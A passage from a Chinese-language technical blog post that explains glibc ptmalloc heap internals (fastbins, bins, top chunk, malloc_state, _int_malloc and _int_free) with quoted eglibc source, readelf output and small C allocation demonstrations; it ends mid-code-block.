class="headerlink" title="Fastbins"></a>Fastbins</h1><p>关于 Fastbins 的介绍, 可以参考:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Fastbins</span></span><br><span class="line"><span class="comment">    // 单向链表, LIFO 规则</span></span><br><span class="line"><span class="comment">    An array of lists holding recently freed small chunks.  Fastbins</span></span><br><span class="line"><span class="comment">    are not doubly linked.  It is faster to single-link them, and</span></span><br><span class="line"><span class="comment">    since chunks are never removed from the middles of these lists,</span></span><br><span class="line"><span class="comment">    double linking is not necessary. Also, unlike regular bins, they</span></span><br><span class="line"><span class="comment">    are not even processed in FIFO order (they use faster LIFO) since</span></span><br><span class="line"><span class="comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span></span><br><span class="line"><span class="comment">    fastbins are normally used.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment">    other free chunks.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></p><p>当进行内存分配时先从 Fastbins 中进行查找, 之后才在 Bins 进行查找; 释放内存时, 当<code>chunk size &lt; max_fast</code>会先存放到 Fastbins.</p><p>另一个需要注意的点就是 Fastbins 的合并(清空), 也就是 <code>malloc_consolidate</code>这个函数的工作.</p><ul><li><p>何时会触发 malloc_consolidate(仅对 _int_malloc 函数而言) ?</p></li><li><p>small bins 尚未初始化</p></li><li><p>需要 size 大于 small bins</p></li><li><p><code>malloc_consolidate</code> 如何进行合并 ?</p></li></ul><p>遍历 Fastbins 中的 chunk, 设置每个 chunk 的空闲标志位为 0, 并合并相邻的空闲 chunk, 之后把该 chunk 存放到 unsorted bin 中.</p><p>Fastbins 是单向链表, 可以通过 <code>fastbin-&gt;fd</code>遍历 Fastbins.</p><h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><p>只有一个 <code>unsorted bin</code>, 进行内存分配查找时先在 Fastbins, small bins 中查找, 之后会在 unsorted bin 中进行查找, 并整理 unsorted bin 中所有的 chunk 到 Bins 中对应的 Bin. unsorted bin 位于<code>bin[1]</code>.</p><p><code>unsorted_bin-&gt;fd</code> 指向双向环链表的头结点, <code>unsorted_bin-&gt;bk</code>指向双向环链表的尾节点, 在头部插入新的节点.</p><h1 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h1><p>以下引用来自 《glibc内存管理ptmalloc源代码分析》。</p><blockquote><p>对于非主分配区会预先从 mmap 区域分配一块较大的空闲内存模拟 sub-heap,通过管 理 sub-heap 来响应用户的需求,因为内存是按地址从低向高进行分配的,在空闲内存的最 高处,必然存在着一块空闲 chunk,叫做 top chunk.当 bins 和 fast bins 都不能满足分配需 要的时候,ptmalloc 会设法在 top chunk 中分出一块内存给用户,如果 top chunk 本身不够大, 分配程序会重新分配一个 sub-heap,并将 top chunk 迁移到新的 sub-heap 上, 新的 sub-heap 与已有的 sub-heap 用单向链表连接起来,然后在新的 top chunk 上分配所需的内存以满足分配的需要,实际上,top chunk 在分配时总是在 fast bins 和 bins 之后被考虑,所以,不论 top chunk 有多大,它都不会被放到 fast bins 或者是 bins 中. top chunk 的大小是随着分配和回 收不停变换的,如果从 top chunk 分配内存会导致 top chunk 减小,如果回收的 chunk 恰好 与 top chunk 相邻,那么这两个 chunk 就会合并成新的 top chunk,从而使 top chunk 变大. 如果在 free 时回收的内存大于某个阈值,并且 top chunk 的大小也超过了收缩阈值,ptmalloc 会收缩 sub-heap,如果 top-chunk 包含了整个 sub-heap,ptmalloc 会调用 munmap 把整个 sub-heap 的内存返回给操作系统.</p><p>由于主分配区是唯一能够映射进程 heap 区域的分配区,它可以通过 sbrk()来增大或是 收缩进程 heap 的大小,ptmalloc 在开始时会预先分配一块较大的空闲内存 (也就是所谓的 heap), 主分配区的 top chunk 在第一次调用 mallocd 时会分配一块(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap,用户从 top chunk 分配内存时,可以直接取出一块内 存给用户.在回收内存时,回收的内存恰好与 top chunk 相邻则合并成新的 top chunk,当该次回收的空闲内存大小达到某个阈值,并且 top chunk 的大小也超过了收缩阈值,会执行内 存收缩,减小 top chunk 的大小,但至少要保留一个页大小的空闲内存,从而把内存归还给 操作系统.如果向主分配区的 top chunk 申请内存,而 top chunk 中没有空闲内存, ptmalloc 会调用 sbrk()将的进程 heap 的边界 brk 上移, 然后修改 top chunk 的大小.</p></blockquote><p>top chunk 位于最高地址.</p><h1 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h1><blockquote><p>当需要分配的 chunk 足够大,而且 fast bins 和 bins 都不能满足要求,甚至 top chunk 本 身也不能满足分配需求时,ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空 间.这样分配的 chunk 在被 free 时将直接解除映射,于是就将内存归还给了操作系统,再 次对这样的内存区的引用将导致 segmentation fault 错误.这样的 chunk 也不会包含在任何 bin 中.</p></blockquote><h1 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h1><blockquote><p>Last remainder 是另外一种特殊的 chunk,就像 top chunk 和 mmaped chunk 一样,不会 在任何 bins 中找到这种 chunk.当需要分配一个 small chunk, 但在 small bins 中找不到合适 的 chunk, 如果 last remainder chunk 的大小大于所需的 small chunk 大小,last remainder chunk 被分裂成两个 chunk, 其中一个 chunk 返回给用户, 另一个 chunk 变成新的 last remainder chuk.</p></blockquote><h1 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h1><p>只存在一个主分区, 但是允许多个非主分区, 主分配区域可以访问 heap 区域 和 mmap 区域, 非主分区只能访问 mmap 区域, 每次用 mmap 分配一块大小的内存当做 sub-heap, 用于模拟 heap. 每次进行内存分配必须加锁请求一个分配区.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c:<span class="number">1663</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ----------- Internal state representation and initialization -----------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> THREAD_STATS</span></span><br><span class="line">  <span class="comment">/* Statistics for locking.  Only used if THREAD_STATS is defined.  */</span></span><br><span class="line">  <span class="type">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>关于 <code>malloc_init_state</code>的定义在:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c:<span class="number">1768</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Initialize a malloc_state struct.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This is called only from within malloc_consolidate, which needs</span></span><br><span class="line"><span class="comment">   be called in the same contexts anyway.  It is never called directly</span></span><br><span class="line"><span class="comment">   outside of malloc_consolidate because some optimizing compilers try</span></span><br><span class="line"><span class="comment">   to inline it at all call points, which turns out not to be an</span></span><br><span class="line"><span class="comment">   optimization at all. (Inlining it in malloc_consolidate is fine though.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><br>在 <code>eglibc-2.19/malloc/malloc.c:1741</code>有一个已经初始化的主分配区 main_arena, 根据 ELF 的结构解析, 已初始化的全局变量存放在 .data 段, 下图作为实践.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">33</span> 是 Section 的 Index</span><br><span class="line">λ : readelf -s /usr/lib/debug<span class="comment">//lib/x86_64-linux-gnu/libc-2.23.so | grep main_arena </span></span><br><span class="line">   <span class="number">915</span>: <span class="number">00000000003</span>c3b20  <span class="number">2192</span> OBJECT  LOCAL  DEFAULT   <span class="number">33</span> main_arena</span><br><span class="line"># 对应 <span class="number">33</span> 的 Section 恰好为 .data</span><br><span class="line">λ : readelf -S /usr/lib/debug<span class="comment">//lib/x86_64-linux-gnu/libc-2.23.so | grep .data</span></span><br><span class="line">  [<span class="number">16</span>] .rodata           NOBITS           <span class="number">0000000000174720</span>  <span class="number">000002b</span>4</span><br><span class="line">  [<span class="number">23</span>] .tdata            NOBITS           <span class="number">00000000003b</span>f7c0  <span class="number">001b</span>f7c0</span><br><span class="line">  [<span class="number">29</span>] .data.rel.ro      NOBITS           <span class="number">00000000003b</span>f900  <span class="number">001b</span>f7c0</span><br><span class="line">  [<span class="number">33</span>] .data             NOBITS           <span class="number">00000000003</span>c3080  <span class="number">001b</span>f7c0</span><br></pre></td></tr></table></figure></p><h1 id="int-malloc-分析"><a href="#int-malloc-分析" class="headerlink" title="_int_malloc() 分析"></a>_int_malloc() 分析</h1><p>先获取分配区指针, 这个过程设计到分配区初始化和分配区加锁, 之后使用 <code>_int_malloc</code> 进行核心的内存分配.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c:<span class="number">3295</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ malloc ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><p>这一段分析来自 《glibc内存管理ptmalloc源代码分析》 但是对其中几个步骤做了补充和添加, 可以对比看一下 (以下针对 32 位字长)</p><p>ptmalloc 的响应用户内存分配要求的具体步骤为:</p><ol><li><p>获取分配区的锁, 为了防止多个线程同时访问同一个分配区, 在进行分配之前需要取得分配区域的锁. 线程先查看线程私有实例中是否已经存在一个分配区, 如果存 在尝试对该分配区加锁, 如果加锁成功, 使用该分配区分配内存, 否则, 该线程搜 索分配区循环链表试图获得一个空闲（没有加锁）的分配区. 如果所有的分配区都 已经加锁, 那么 ptmalloc 会开辟一个新的分配区, 把该分配区加入到全局分配区循 环链表和线程的私有实例中并加锁, 然后使用该分配区进行分配操作. 开辟出来的 新分配区一定为非主分配区, 因为主分配区是从父进程那里继承来的. 开辟非主分配区时会调用 mmap()创建一个 sub-heap, 并设置好 top chunk.</p></li><li><p>将用户的请求大小转换为实际需要分配的 chunk 空间大小. 具体查看 request2size 宏 (malloc.c:3332)</p></li><li><p>判断所需分配 chunk 的大小是否满足 chunk_size &lt;= max_fast (max_fast 默认为 64B), 如果是的话, 则转下一步, 否则跳到第 5 步. (malloc.c:3340)</p></li><li><p>首先尝试在 Fastbins 中查找所需大小的 chunk 分配给用户. 如果可以找到, 则分配结束. 否则转到下一步. (malloc.c:3340)</p></li><li><p>判断所需大小是否处在 small bins 中, 即判断 chunk_size &lt; 512B 是否成立. 如果 chunk 大小处在 small bins 中, 则转下一步, 否则转到第 7 步. (malloc.c:3377)</p></li><li><p>根据所需分配的 chunk 的大小, 找到具体所在的某个 small bin, 从该 Bin 的尾部摘取一个恰好满足大小的 chunk. 若成功, 则分配结束, 否则, 转到 8. (malloc.c:3377)</p></li><li><p>到了这一步, 说明需要分配的是一块大的内存, 于是, ptmalloc 首先会遍历 Fastbins 中的 chunk, 将相邻的空闲 chunk 进行合并, 并链接到 unsorted bin 中. 对于 Fastbins 的合并是由 malloc_consolidate 做处理. (malloc.c:3421)</p></li><li><p>遍历 unsorted bin 中的 chunk, 如果请求的 chunk 是一个 small chunk, 且 unsorted bin 只有一个 chunk, 并且这个 chunk 在上次分配时被使用过(也就是 last_remainder), 并且 chunk 的大小大于 (分配的大小 + MINSIZE), 这种情况下就直接将该 chunk 进行切割, 分配结束, 否则继续遍历, 如果发现一个 unsorted bin 的 size 恰好等于需要分配的 size, 命中缓存, 分配结束, 否则将根据 chunk 的空间大小将其放入对应的 small bins 或是 large bins 中, 遍历完成后, 转入下一步. (malloc.c:3442)</p></li><li><p>到了这一步说明需要分配的是一块大的内存, 并且 Fastbins 和 unsorted bin 中所有的 chunk 都清除干净 了. 从 large bins 中按照 “smallest-first, best-fit”(最小&amp;合适, 也就是说大于或等于所需 size 的最小 chunk) 原则, 找一个合适的 chunk, 从中划分一块合适大小的 chunk 进行切割, 并将剩下的部分放到 unsorted bin, 若操作成功, 则分配结束, 否则转到下一步. (malloc.c:3576)</p></li><li><p>到了这一步说明在对应的 bin 上没有找到合适的大小, 无论是 small bin 还是 large bin, 对于 small bin, 如果没有对应大小的 small bin, 只能 idx+1. 对于 large bin,在上一步的 large bin 并不一定能找到合适的 chunk 进行切割, 因为 large bins 间隔是很大的, 假如当前的 idx 的 large bin 只有一个 chunk, 但是所需 size 大于该 chunk, 这就导致找不到合适的, 只能继续 idx+1, 最后都需要根据 bitmap 找到之后第一个非空闲的 bin. 在这两种情况下找到的 bin 中的 chunk 一定可以进行切割或者全部分配(剩余的 size &lt; MINSIZE) (malloc.c:3649)</p></li><li><p>如果仍然都没有找到合适的 chunk, 那么就需要操作 top chunk 来进行分配了. 判断 top chunk 大小是否满足所需 chunk 的大小, 如果是, 则从 top chunk 中分出一块来. 否则转到下一步. (malloc.c:3749)</p></li><li><p>到了这一步, 说明 top chunk 也不能满足分配要求, 所以, 于是就有了两个选择: 如果是主分配区, 调用 sbrk(), 增加 top chunk 大小；如果是非主分配区, 调用 mmap 来分配一个新的 sub-heap, 增加 top chunk 大小；或者使用 mmap()来直接分配. 在这里, 需要依靠 chunk 的大小来决定到底使用哪种方法. 判断所需分配的 chunk 大小是否大于等于 mmap 分配阈值, 如果是的话, 则转下一步, 调用 mmap 分配, 否则跳到第 13 步, 增加 top chunk 的大小. (malloc.c:3800)</p></li><li><p>使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间. 然后将内存指针返回给用户.</p></li><li><p>判断是否为第一次调用 malloc, 若是主分配区, 则需要进行一次初始化工作, 分配一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap. 若已经初始化过了, 主分配区则调用 sbrk()增加 heap 空间, 分主分配区则在 top chunk 中切割出一个 chunk, 使之满足分配需求, 并将内存指针返回给用户.</p></li></ol><h1 id="int-free-分析"><a href="#int-free-分析" class="headerlink" title="_int_free() 分析"></a>_int_free() 分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c:<span class="number">3808</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ free ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><p>下面分析具体过程(针对 32 位字长)</p><ol><li><p>free()函数同样首先需要获取分配区的锁, 来保证线程安全.</p></li><li><p>判断传入的指针是否为 0, 如果为 0, 则什么都不做, 直接 return.否则转下一步.</p></li><li><p>判断 chunk 的大小和所处的位置, 若 chunk_size &lt;= max_fast, 并且 chunk 并不位于 heap 的顶部, 也就是说并不与 Top chunk 相邻, 则转到下一步, 否则跳到第 5 步.（因为与 top chunk 相邻的 chunk(fastbin) ,会与 top chunk 进行合并, 所以这里不仅需要判断大小, 还需要判断相邻情况）</p></li><li><p>将 chunk 放到 Fastbins 中, chunk 放入到 Fastbins 中时, 并不修改该 chunk 使用状 态位 P.也不与相邻的 chunk 进行合并.只是放进去, 如此而已.这一步做完之后 释放便结束了, 程序从 free()函数中返回.</p></li><li><p>判断所需释放的 chunk 是否为 mmaped chunk, 如果是, 则调用 munmap()释放 mmaped chunk, 解除内存空间映射, 该该空间不再有效.如果开启了 mmap 分配 阈值的动态调整机制, 并且当前回收的 chunk 大小大于 mmap 分配阈值, 将 mmap 分配阈值设置为该 chunk 的大小, 将 mmap 收缩阈值设定为 mmap 分配阈值的 2 倍, 释放完成, 否则跳到下一步.</p></li><li><p>判断前一个 chunk 是否处在使用中, 如果前一个块也是空闲块, 则合并.并转下一步.</p></li><li><p>判断当前释放 chunk 的下一个块是否为 top chunk, 如果是, 则转第 9 步, 否则转 下一步.</p></li><li><p>判断下一个 chunk 是否处在使用中, 如果下一个 chunk 也是空闲的, 则合并, 并将合并后的 chunk 放到 unsorted bin 中.注意, 这里在合并的过程中, 要更新 chunk 的大小, 以反映合并后的 chunk 的大小.并转到第 10 步.</p></li><li><p>如果执行到这一步, 说明释放了一个与 top chunk 相邻的 chunk.则无论它有多大, 都将它与 top chunk 合并, 并更新 top chunk 的大小等信息.转下一步.</p></li><li><p>判断合并后的 chunk 的大小是否大于 FASTBIN_CONSOLIDATION_THRESHOLD（默认 64KB）, 如果是的话, 则会触发进行 Fastbins 的合并操作(malloc_consolidate), Fastbins 中的 chunk 将被遍历, 并与相邻的空闲 chunk 进行合并, 合并后的 chunk 会被放到 unsorted bin 中. Fastbins 将变为空, 操作完成之后转下一步.</p></li><li><p>判断 top chunk 的大小是否大于 mmap 收缩阈值（默认为 128KB）, 如果是的话, 对于主分配区, 则会试图归还 top chunk 中的一部分给操作系统.但是最先分配的 128KB 空间是不会归还的, ptmalloc 会一直管理这部分内存, 用于响应用户的分配 请求；如果为非主分配区, 会进行 sub-heap 收缩, 将 top chunk 的一部分返回给操 作系统, 如果 top chunk 为整个 sub-heap, 会把整个 sub-heap 还回给操作系统.做 完这一步之后, 释放结束, 从 free() 函数退出.可以看出, 收缩堆的条件是当前 free 的 chunk 大小加上前后能合并 chunk 的大小大于 64k, 并且要 top chunk 的大 小要达到 mmap 收缩阈值, 才有可能收缩堆.</p></li></ol><h1 id="特殊的分配情况举例说明"><a href="#特殊的分配情况举例说明" class="headerlink" title="特殊的分配情况举例说明"></a>特殊的分配情况举例说明</h1><p>下面几个的演示例子中没有使用到一些 heap 分析插件, 会在 ptmalloc 的利用那一步使用到 heap 分析的插件.</p><h2 id="下面一段表明小于-Fastbins的size-在释放后不会进行合并-如果使用-gdb-查看-chunk-信息可以看到-P-标志位为-1-这里需要注意的是看下一个-chunk-的-P-标志位-而不是当前-chunk-的标志位-这里就不进行演示了"><a href="#下面一段表明小于-Fastbins的size-在释放后不会进行合并-如果使用-gdb-查看-chunk-信息可以看到-P-标志位为-1-这里需要注意的是看下一个-chunk-的-P-标志位-而不是当前-chunk-的标志位-这里就不进行演示了" class="headerlink" title="下面一段表明小于 Fastbins的size 在释放后不会进行合并, 如果使用 gdb 查看 chunk 信息可以看到 P 标志位为 1, 这里需要注意的是看下一个 chunk 的 P 标志位, 而不是当前 chunk 的标志位, 这里就不进行演示了."></a>下面一段表明小于 Fastbins的size 在释放后不会进行合并, 如果使用 gdb 查看 chunk 信息可以看到 P 标志位为 1, 这里需要注意的是看下一个 chunk 的 P 标志位, 而不是当前 chunk 的标志位, 这里就不进行演示了.</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *m1 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="type">void</span> * ms[<span class="number">200</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(t = <span class="number">0</span>; t &lt; <span class="number">200</span>; t++)</span><br><span class="line">    ms[t] = <span class="built_in">malloc</span>(<span class="number">120</span>); <span class="comment">// default fastbin size</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(t = <span class="number">0</span>; t &lt; <span class="number">200</span>; t++)</span><br><span class="line">    <span class="built_in">free</span>(ms[t]);</span><br><span class="line">  <span class="type">void</span> *m2 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,m1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,m2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// result:</span></span><br><span class="line">λ : gcc -g -o test2 test2.c &amp;&amp; ./test2</span><br><span class="line"><span class="number">0x17c2010</span></span><br><span class="line"><span class="number">0x17c8450</span></span><br></pre></td></tr></table></figure><h2 id="下面例子表明-当-fast-bin-的相邻为空闲-chunk-以及相邻-top-chunk-的情况-都不会进行合并-但是对于-top-chunk-的情况有些特殊"><a href="#下面例子表明-当-fast-bin-的相邻为空闲-chunk-以及相邻-top-chunk-的情况-都不会进行合并-但是对于-top-chunk-的情况有些特殊" class="headerlink" title="下面例子表明, 当 fast bin 的相邻为空闲 chunk, 以及相邻 top chunk 的情况, 都不会进行合并, 但是对于 top chunk 的情况有些特殊."></a>下面例子表明, 当 fast bin 的相邻为空闲 chunk, 以及相邻 top chunk 的情况, 都不会进行合并, 但是对于 top chunk 的情况有些特殊.</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  TRIM_FASTBINS controls whether free() of a very small chunk can</span></span><br><span class="line"><span class="comment">  immediately lead to trimming. Setting to true (1) can reduce memory</span></span><br><span class="line"><span class="comment">  footprint, but will almost always slow down programs that use a lot</span></span><br><span class="line"><span class="comment">  of small chunks.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Define this only if you are willing to give up some speed to more</span></span><br><span class="line"><span class="comment">  aggressively reduce system-level memory footprint when releasing</span></span><br><span class="line"><span class="comment">  memory in programs that use many small chunks.  You can get</span></span><br><span class="line"><span class="comment">  essentially the same effect by setting MXFAST to 0, but this can</span></span><br><span class="line"><span class="comment">  lead to even greater slowdowns in programs using many small chunks.</span></span><br><span class="line"><span class="comment">  TRIM_FASTBINS is an in-between compile-time option, that disables</span></span><br><span class="line"><span class="comment">  only those chunks bordering topmost memory from being placed in</span></span><br><span class="line"><span class="comment">  fastbins.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>当设置 TRIM_FASTBINS=1 fast bin 会与相邻的 top chunk 进行合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">λ : cat test5.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *m1 = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">    <span class="type">void</span> *m2 = <span class="built_in">malloc</span>(<span class="number">40</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">void</span> *m3 = <span class="built_in">malloc</span>(<span class="number">80</span>);</span><br><span class="line">    <span class="built_in">free</span>(m1);</span><br><span class="line">    <span class="built_in">free</span>(m2);</span><br><span class="line">    <span class="type">void</span> *m4 = <span 